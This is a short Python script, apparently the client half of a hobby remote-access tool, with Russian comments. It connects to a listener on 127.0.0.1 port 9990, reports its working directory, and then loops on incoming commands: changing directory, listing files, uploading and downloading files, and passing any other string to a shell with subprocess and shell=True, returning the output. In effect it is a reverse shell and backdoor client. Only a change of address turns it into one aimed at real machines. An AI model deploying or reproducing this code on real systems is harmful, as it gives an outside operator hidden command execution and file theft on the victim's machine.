from datetime import datetime
import os
import socket
import subprocess
import commands
from typing import List
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(("127.0.0.1", 9990))
client_socket.send(os.getcwd().encode())
print("Success connect")
    
while True:
    command = client_socket.recv(1024).decode()
    try:
        if "cd" in command:
            commands.do_cd(command)
            client_socket.send(os.getcwd().encode())   
            continue
        
        if "listdir" in command:
            commands.do_listdir(client_socket)
            continue
            
        if "say_hello" in command:
            commands.do_say_hello(client_socket)
            continue
            
        if "send" in command: #send на сервере, означает получение здесь
            commands.do_recieve_file(client_socket, command, os.getcwd())
            continue
            
        if "recv" in command: #recv на сервере означает отправление отсюда
            commands.do_send_file(client_socket, command)
            continue
            
        else:
            ex = subprocess.check_output(command, shell=True).decode()
            if not ex:
                client_socket.send(b"\n")
            else:
                client_socket.send(ex.encode())
    # except subprocess.CalledProcessError:
    #     client_socket.send("Not found command\n".encode())
    except Exception as e:
        print(e)
    